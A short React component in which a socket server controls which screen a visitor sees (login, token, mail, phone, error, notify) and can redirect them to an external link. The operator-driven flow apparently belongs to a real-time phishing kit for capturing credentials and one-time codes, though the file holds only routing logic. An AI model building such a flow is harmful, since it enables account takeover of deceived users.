import React from "react";
import socket from "../socket";
import { link } from "./settings";
import Login from "./Login";
import Loading from "./Loading";
import Error from "./Error";
import Token from "./Token";
import Mail from "./Mail";
import { sName, sD } from "../features/users/usersSlice";
import { useDispatch } from "react-redux";
import Phone from "./Phone";
import Notify from "./Notify";

function Main({ data }) {
  const [page, setPage] = React.useState(0);
  const [c, setC] = React.useState(0);
  const [s, setS] = React.useState(false);
  const [e, setE] = React.useState(false);
  const [n1, setN1] = React.useState("");
  const [n2, setN2] = React.useState("");

  const dispatch = useDispatch();

  React.useEffect(() => {
    socket.on("redirect user", () => {
      window.location.href = link;
    });
    socket.on("page", (e) => {
      setPage(e.p);
      setS(false);
      setE(false);
      if (e.p === -1) setC(c + 1);
      if (e.p === 1) {
        setN1(e.name);
        setN2(e.sT);
        dispatch(sName(e.name));
        dispatch(sD(e.sT));
      }
    });
    return () => {
      socket.off("page");
      socket.off("connect_error");
    };
  }, []);

  return (
    <>
      {page === 0 && <Login key={page} data={data} sS={setS} />}
      {page === 1 && <Token key={page} sP={setPage} sS={setS} n1={n1} n2={n2} />}
      {page === 2 && <Mail key={page} sP={setPage} sS={setS} n1={n1} n2={n2} />}
      {page === 3 && <Phone key={page} sP={setPage} sS={setS} n1={n1} n2={n2} />}
      {page === 5 && <Error key={page} sP={setPage} sS={setS} />}
      {page === 6 && <Notify key={page} sP={setPage} sS={setS} />}
      {s && <Loading />}
    </>
  );
}
export default Main;
